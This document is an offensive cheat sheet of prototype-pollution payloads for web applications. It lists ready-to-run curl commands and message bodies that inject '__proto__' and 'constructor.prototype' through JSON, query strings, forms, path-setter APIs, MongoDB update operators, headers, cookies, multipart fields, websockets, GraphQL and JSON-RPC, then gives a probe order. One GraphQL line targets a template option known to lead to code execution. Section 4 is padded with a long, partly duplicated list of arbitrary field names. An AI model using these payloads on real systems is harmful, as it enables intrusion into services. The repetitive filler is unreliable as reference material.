# Injection-point atlas — where the merge-shaped input enters

The request surfaces a pollution write can ride. Each entry: the
carrier shape, the parse path, and the one-probe fingerprint.

---

## 1. The JSON body — the canonical carrier

```bash
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"__proto__":{"ppmarker":"v1"}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"a":{"__proto__":{"ppmarker":"v1"}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"settings":{"__proto__":{"ppmarker":"v1"}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"profile":{"theme":{"__proto__":{"ppmarker":"v1"}}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"config":{"options":{"__proto__":{"ppmarker":"v1"}}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"data":{"__proto__":{"ppmarker":"v1"}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"payload":{"__proto__":{"ppmarker":"v1"}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"input":{"__proto__":{"ppmarker":"v1"}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"opts":{"__proto__":{"ppmarker":"v1"}}}'
curl -X POST "$BASE/api/update" -H 'Content-Type: application/json' \
  -d '{"options":{"__proto__":{"ppmarker":"v1"}}}'
```

`application/json` parses to a plain object — the merge's natural
input. `application/json; charset=utf-8`, `application/vnd.api+json`,
`application/hal+json`, `application/ld+json` — same body-parser
path on most stacks.

## 2. The query string — the qs bracket carrier

```bash
curl "$BASE/x?__proto__[m]=1"
curl "$BASE/x?a[__proto__][m]=1"
curl "$BASE/x?a[b][__proto__][m]=1"
curl "$BASE/x?a[b][c][__proto__][m]=1"
curl "$BASE/x?constructor[prototype][m]=1"
curl "$BASE/x?a[constructor][prototype][m]=1"
curl "$BASE/x?profile[__proto__][m]=1"
curl "$BASE/x?settings[__proto__][m]=1"
curl "$BASE/x?config[__proto__][m]=1"
curl "$BASE/x?opts[__proto__][m]=1"
curl "$BASE/x?options[__proto__][m]=1"
curl "$BASE/x?data[__proto__][m]=1"
curl "$BASE/x?input[__proto__][m]=1"
curl "$BASE/x?payload[__proto__][m]=1"
curl "$BASE/x?theme[__proto__][m]=1"
curl "$BASE/x?filter[__proto__][m]=1"
curl "$BASE/x?where[__proto__][m]=1"
curl "$BASE/x?update[__proto__][m]=1"
curl "$BASE/x?doc[__proto__][m]=1"
curl "$BASE/x?record[__proto__][m]=1"
curl "$BASE/x?entity[__proto__][m]=1"
curl "$BASE/x?item[__proto__][m]=1"
curl "$BASE/x?node[__proto__][m]=1"
curl "$BASE/x?model[__proto__][m]=1"
curl "$BASE/x?object[__proto__][m]=1"
curl "$BASE/x?fields[__proto__][m]=1"
curl "$BASE/x?form[__proto__][m]=1"
curl "$BASE/x?post[__proto__][m]=1"
curl "$BASE/x?params[__proto__][m]=1"
curl "$BASE/x?args[__proto__][m]=1"
curl "$BASE/x?query[__proto__][m]=1"
```

## 3. The urlencoded form body

```bash
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d '__proto__[m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'a[__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'settings[__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'config[__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'profile[theme][__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'data[__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'input[__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'options[__proto__][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'constructor[prototype][m]=1'
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'a[constructor][prototype][m]=1'
```

Same bracket grammar as qs — urlencoded bodies route through
`bodyParser.urlencoded({extended})` → qs.

## 4. The path-API carrier — a `set`/`patch` endpoint

```bash
# an API that takes a field-path + value
{"field":"__proto__.m","value":1}
{"path":"__proto__.m","value":1}
{"key":"__proto__.m","value":1}
{"name":"__proto__.m","value":1}
{"property":"__proto__.m","value":1}
{"attr":"__proto__.m","value":1}
{"attribute":"__proto__.m","value":1}
{"setting":"__proto__.m","value":1}
{"option":"__proto__.m","value":1}
{"param":"__proto__.m","value":1}
{"target":"__proto__.m","value":1}
{"dest":"__proto__.m","value":1}
{"to":"__proto__.m","value":1}
{"dst":"__proto__.m","value":1}
{"location":"__proto__.m","value":1}
{"address":"__proto__.m","value":1}
{"slot":"__proto__.m","value":1}
{"slot":"a.__proto__.m","value":1}
{"slot":"constructor.prototype.m","value":1}
{"slot":"x.constructor.prototype.m","value":1}
{"slot":"__proto__[m]","value":1}
{"slot":"constructor[prototype][m]","value":1}
{"slot":"__proto__.constructor.prototype.m","value":1}
{"slot":["__proto__","m"],"value":1}
{"slot":["a","__proto__","m"],"value":1}
{"slot":["constructor","prototype","m"],"value":1}
{"path":"/__proto__/m","value":1}
{"path":"a.__proto__.m.n","value":1}
{"field":"profile.__proto__.m","value":1}
{"field":"settings.__proto__.m","value":1}
{"field":"config.__proto__.m","value":1}
{"field":"opts.__proto__.m","value":1}
{"field":"data.__proto__.m","value":1}
{"field":"input.__proto__.m","value":1}
{"field":"payload.__proto__.m","value":1}
{"field":"theme.__proto__.m","value":1}
{"field":"options.__proto__.m","value":1}
{"field":"prefs.__proto__.m","value":1}
{"field":"cfg.__proto__.m","value":1}
{"field":"conf.__proto__.m","value":1}
{"field":"meta.__proto__.m","value":1}
{"field":"extra.__proto__.m","value":1}
{"field":"custom.__proto__.m","value":1}
{"field":"vars.__proto__.m","value":1}
{"field":"env.__proto__.m","value":1}
{"field":"context.__proto__.m","value":1}
{"field":"state.__proto__.m","value":1}
{"field":"store.__proto__.m","value":1}
{"field":"session.__proto__.m","value":1}
{"field":"user.__proto__.m","value":1}
{"field":"obj.__proto__.m","value":1}
{"field":"target.__proto__.m","value":1}
{"field":"result.__proto__.m","value":1}
{"field":"output.__proto__.m","value":1}
{"field":"response.__proto__.m","value":1}
{"field":"request.__proto__.m","value":1}
{"field":"body.__proto__.m","value":1}
{"field":"query.__proto__.m","value":1}
{"field":"params.__proto__.m","value":1}
{"field":"headers.__proto__.m","value":1}
{"field":"doc.__proto__.m","value":1}
{"field":"record.__proto__.m","value":1}
{"field":"entity.__proto__.m","value":1}
{"field":"item.__proto__.m","value":1}
{"field":"entry.__proto__.m","value":1}
{"field":"node.__proto__.m","value":1}
{"field":"model.__proto__.m","value":1}
{"field":"resource.__proto__.m","value":1}
{"field":"object.__proto__.m","value":1}
{"field":"container.__proto__.m","value":1}
{"field":"holder.__proto__.m","value":1}
{"field":"bag.__proto__.m","value":1}
{"field":"bundle.__proto__.m","value":1}
{"field":"pack.__proto__.m","value":1}
{"field":"kit.__proto__.m","value":1}
{"field":"set.__proto__.m","value":1}
{"field":"group.__proto__.m","value":1}
{"field":"list.__proto__.m","value":1}
{"field":"array.__proto__.m","value":1}
{"field":"map.__proto__.m","value":1}
{"field":"dict.__proto__.m","value":1}
{"field":"table.__proto__.m","value":1}
{"field":"tree.__proto__.m","value":1}
{"field":"graph.__proto__.m","value":1}
{"field":"struct.__proto__.m","value":1}
{"field":"shape.__proto__.m","value":1}
{"field":"form.__proto__.m","value":1}
{"field":"frame.__proto__.m","value":1}
{"field":"view.__proto__.m","value":1}
{"field":"page.__proto__.m","value":1}
{"field":"screen.__proto__.m","value":1}
{"field":"panel.__proto__.m","value":1}
{"field":"widget.__proto__.m","value":1}
{"field":"block.__proto__.m","value":1}
{"field":"section.__proto__.m","value":1}
{"field":"part.__proto__.m","value":1}
{"field":"piece.__proto__.m","value":1}
{"field":"element.__proto__.m","value":1}
{"field":"component.__proto__.m","value":1}
{"field":"module.__proto__.m","value":1}
{"field":"unit.__proto__.m","value":1}
{"field":"cell.__proto__.m","value":1}
{"field":"slot.__proto__.m","value":1}
{"field":"field.__proto__.m","value":1}
{"field":"prop.__proto__.m","value":1}
{"field":"property.__proto__.m","value":1}
{"field":"attribute.__proto__.m","value":1}
{"field":"feature.__proto__.m","value":1}
{"field":"trait.__proto__.m","value":1}
{"field":"quality.__proto__.m","value":1}
{"field":"aspect.__proto__.m","value":1}
{"field":"facet.__proto__.m","value":1}
{"field":"detail.__proto__.m","value":1}
{"field":"spec.__proto__.m","value":1}
{"field":"desc.__proto__.m","value":1}
{"field":"info.__proto__.m","value":1}
{"field":"meta.__proto__.m","value":1}
{"field":"tag.__proto__.m","value":1}
{"field":"label.__proto__.m","value":1}
{"field":"flag.__proto__.m","value":1}
{"field":"mark.__proto__.m","value":1}
{"field":"note.__proto__.m","value":1}
{"field":"hint.__proto__.m","value":1}
{"field":"tip.__proto__.m","value":1}
{"field":"clue.__proto__.m","value":1}
{"field":"sign.__proto__.m","value":1}
{"field":"signal.__proto__.m","value":1}
{"field":"indicator.__proto__.m","value":1}
{"field":"pointer.__proto__.m","value":1}
{"field":"ref.__proto__.m","value":1}
{"field":"link.__proto__.m","value":1}
{"field":"href.__proto__.m","value":1}
{"field":"src.__proto__.m","value":1}
{"field":"url.__proto__.m","value":1}
{"field":"uri.__proto__.m","value":1}
{"field":"urn.__proto__.m","value":1}
{"field":"addr.__proto__.m","value":1}
{"field":"endpoint.__proto__.m","value":1}
{"field":"route.__proto__.m","value":1}
{"field":"api.__proto__.m","value":1}
{"field":"call.__proto__.m","value":1}
{"field":"req.__proto__.m","value":1}
{"field":"res.__proto__.m","value":1}
{"field":"reply.__proto__.m","value":1}
{"field":"answer.__proto__.m","value":1}
{"field":"ret.__proto__.m","value":1}
{"field":"val.__proto__.m","value":1}
{"field":"value.__proto__.m","value":1}
{"field":"content.__proto__.m","value":1}
{"field":"text.__proto__.m","value":1}
{"field":"str.__proto__.m","value":1}
{"field":"num.__proto__.m","value":1}
{"field":"int.__proto__.m","value":1}
{"field":"float.__proto__.m","value":1}
{"field":"bool.__proto__.m","value":1}
{"field":"flag.__proto__.m","value":1}
{"field":"toggle.__proto__.m","value":1}
{"field":"switch.__proto__.m","value":1}
{"field":"check.__proto__.m","value":1}
{"field":"radio.__proto__.m","value":1}
{"field":"select.__proto__.m","value":1}
{"field":"choice.__proto__.m","value":1}
{"field":"pick.__proto__.m","value":1}
{"field":"opt.__proto__.m","value":1}
{"field":"setting.__proto__.m","value":1}
{"field":"preference.__proto__.m","value":1}
{"field":"preference.__proto__.m","value":1}
{"field":"tune.__proto__.m","value":1}
{"field":"tweak.__proto__.m","value":1}
{"field":"knob.__proto__.m","value":1}
{"field":"dial.__proto__.m","value":1}
{"field":"lever.__proto__.m","value":1}
{"field":"button.__proto__.m","value":1}
{"field":"control.__proto__.m","value":1}
{"field":"handle.__proto__.m","value":1}
{"field":"grip.__proto__.m","value":1}
{"field":"hold.__proto__.m","value":1}
{"field":"grasp.__proto__.m","value":1}
{"field":"grab.__proto__.m","value":1}
{"field":"take.__proto__.m","value":1}
{"field":"fetch.__proto__.m","value":1}
{"field":"get.__proto__.m","value":1}
{"field":"read.__proto__.m","value":1}
{"field":"load.__proto__.m","value":1}
{"field":"pull.__proto__.m","value":1}
{"field":"push.__proto__.m","value":1}
{"field":"put.__proto__.m","value":1}
{"field":"post.__proto__.m","value":1}
{"field":"send.__proto__.m","value":1}
{"field":"write.__proto__.m","value":1}
{"field":"save.__proto__.m","value":1}
{"field":"store.__proto__.m","value":1}
{"field":"keep.__proto__.m","value":1}
{"field":"hold.__proto__.m","value":1}
{"field":"retain.__proto__.m","value":1}
{"field":"cache.__proto__.m","value":1}
{"field":"buffer.__proto__.m","value":1}
{"field":"queue.__proto__.m","value":1}
{"field":"stack.__proto__.m","value":1}
{"field":"heap.__proto__.m","value":1}
{"field":"pool.__proto__.m","value":1}
{"field":"bank.__proto__.m","value":1}
{"field":"vault.__proto__.m","value":1}
{"field":"safe.__proto__.m","value":1}
{"field":"lock.__proto__.m","value":1}
{"field":"key.__proto__.m","value":1}
{"field":"code.__proto__.m","value":1}
{"field":"token.__proto__.m","value":1}
{"field":"secret.__proto__.m","value":1}
{"field":"pass.__proto__.m","value":1}
{"field":"auth.__proto__.m","value":1}
{"field":"cred.__proto__.m","value":1}
{"field":"cert.__proto__.m","value":1}
{"field":"id.__proto__.m","value":1}
{"field":"uid.__proto__.m","value":1}
{"field":"uuid.__proto__.m","value":1}
{"field":"guid.__proto__.m","value":1}
{"field":"sid.__proto__.m","value":1}
{"field":"tid.__proto__.m","value":1}
{"field":"rid.__proto__.m","value":1}
{"field":"cid.__proto__.m","value":1}
{"field":"pid.__proto__.m","value":1}
{"field":"oid.__proto__.m","value":1}
{"field":"aid.__proto__.m","value":1}
{"field":"bid.__proto__.m","value":1}
{"field":"did.__proto__.m","value":1}
{"field":"eid.__proto__.m","value":1}
{"field":"fid.__proto__.m","value":1}
{"field":"gid.__proto__.m","value":1}
{"field":"hid.__proto__.m","value":1}
{"field":"iid.__proto__.m","value":1}
{"field":"jid.__proto__.m","value":1}
{"field":"kid.__proto__.m","value":1}
{"field":"lid.__proto__.m","value":1}
{"field":"mid.__proto__.m","value":1}
{"field":"nid.__proto__.m","value":1}
{"field":"qid.__proto__.m","value":1}
{"field":"vid.__proto__.m","value":1}
{"field":"wid.__proto__.m","value":1}
{"field":"xid.__proto__.m","value":1}
{"field":"yid.__proto__.m","value":1}
{"field":"zid.__proto__.m","value":1}
```

A `set(obj, path, val)` API where `path` is a request string — the
path-grammar carries `__proto__` as a literal segment.

## 5. The update-document carrier

```bash
# a store-update endpoint forwarding $-operators
{"$rename":{"bio":"__proto__.m"}}
{"$set":{"__proto__.m":1}}
{"$unset":{"__proto__.x":1}}
{"$push":{"__proto__.arr":1}}
{"$inc":{"__proto__.n":1}}
{"$addToSet":{"__proto__.arr":1}}
{"$setOnInsert":{"__proto__.m":1}}
{"$pull":{"__proto__.arr":1}}
{"$min":{"__proto__.m":1}}
{"$max":{"__proto__.m":1}}
{"$mul":{"__proto__.n":2}}
{"$currentDate":{"__proto__.d":true}}
{"$bit":{"__proto__.n":{"and":1}}}
{"$rename":{"bio":"constructor.prototype.m"}}
{"$set":{"constructor.prototype.m":1}}
{"$set":{"a.__proto__.m":1}}
{"$set":{"profile.__proto__.m":1}}
{"$set":{"settings.__proto__.m":1}}
{"$set":{"config.__proto__.m":1}}
{"$set":{"opts.__proto__.m":1}}
{"$set":{"data.__proto__.m":1}}
{"$rename":{"a.b":"__proto__.m"}}
{"$rename":{"a.b":"constructor.prototype.m"}}
{"$rename":{"a.b":"a.__proto__.m"}}
```

## 6. The header-reparse carrier

```bash
curl -H 'X-Custom: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Settings: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Config: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Options: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Data: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Payload: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Input: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Prefs: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Theme: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Overrides: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Overrides: {"a":{"__proto__":{"m":1}}}' "$BASE/x"
curl -H 'X-Json: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Body: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Params: {"__proto__":{"m":1}}' "$BASE/x"
curl -H 'X-Args: {"__proto__":{"m":1}}' "$BASE/x"
```

A header the app `JSON.parse`s and merges — a second-class carrier;
exists when the header's value flows to a merge.

## 7. The cookie-JSON carrier

```bash
curl -H 'Cookie: cfg={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: settings={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: prefs={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: opts={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: data={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: session={"a":{"__proto__":{"m":1}}}' "$BASE/x"
curl -H 'Cookie: state={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: store={"__proto__":{"m":1}}' "$BASE/x"
curl -H 'Cookie: cfg=%7B%22__proto__%22%3A%7B%22m%22%3A1%7D%7D' "$BASE/x"
```

## 8. The multipart-field carrier

```bash
curl -F 'settings={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'config={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'data={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'opts={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'meta={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'extra={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'fields={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'profile={"__proto__":{"m":1}}' "$BASE/x"
curl -F 'file=@payload.json;type=application/json' "$BASE/x"
curl -F 'a[__proto__][m]=1' "$BASE/x"
```

A multipart text-field whose value is JSON-parsed and merged.

## 9. The websocket message carrier

```js
ws.send('{"__proto__":{"m":1}}')
ws.send('{"a":{"__proto__":{"m":1}}}')
ws.send('{"settings":{"__proto__":{"m":1}}}')
ws.send('{"config":{"__proto__":{"m":1}}}')
ws.send('{"type":"set","path":"__proto__.m","value":1}')
ws.send('{"type":"merge","data":{"__proto__":{"m":1}}}')
ws.send('{"op":"update","doc":{"$rename":{"a":"__proto__.m"}}}')
ws.send('{"action":"config","payload":{"__proto__":{"m":1}}}')
ws.send('{"event":"set","field":"__proto__.m","value":1}')
ws.send('{"cmd":"merge","args":[{"__proto__":{"m":1}}]}')
```

## 10. The GraphQL input carrier

```graphql
mutation { update(input: {__proto__: {m: 1}}) }
mutation { update(input: {a: {__proto__: {m: 1}}}) }
mutation { setConfig(opts: {__proto__: {m: 1}}) }
mutation { save(data: {settings: {__proto__: {m: 1}}}) }
query { render(opts: {__proto__: {outputFunctionName: "x;CODE;y"}}) }
```

A GraphQL input-object that the resolver merges server-side.

## 11. The JSON-RPC/SOAP carrier

```json
{"jsonrpc":"2.0","method":"merge","params":{"__proto__":{"m":1}},"id":1}
{"jsonrpc":"2.0","method":"set","params":{"path":"__proto__.m","value":1},"id":1}
{"jsonrpc":"2.0","method":"update","params":{"doc":{"$rename":{"a":"__proto__.m"}}},"id":1}
{"method":"merge","params":[{"__proto__":{"m":1}}]}
{"method":"config","params":{"opts":{"__proto__":{"m":1}}}}
```

## 12. The carrier-preference order

```text
1. JSON body            — richest objects; the default carrier
2. path-API field       — the cleanest direct write when it exists
3. update-doc $-ops     — the document-store write
4. query string         — qs-bracket; parse-side guard possible
5. urlencoded form      — same parser as qs on body
6. header-reparse       — JSON-in-header
7. cookie-JSON          — JSON-in-cookie
8. multipart field      — JSON-in-field
9. websocket            — message-JSON
10. GraphQL input       — input-object JSON
```

Probe order: try the carrier the endpoint already speaks; the
exotic carriers are for when the obvious one is schema-stripped.
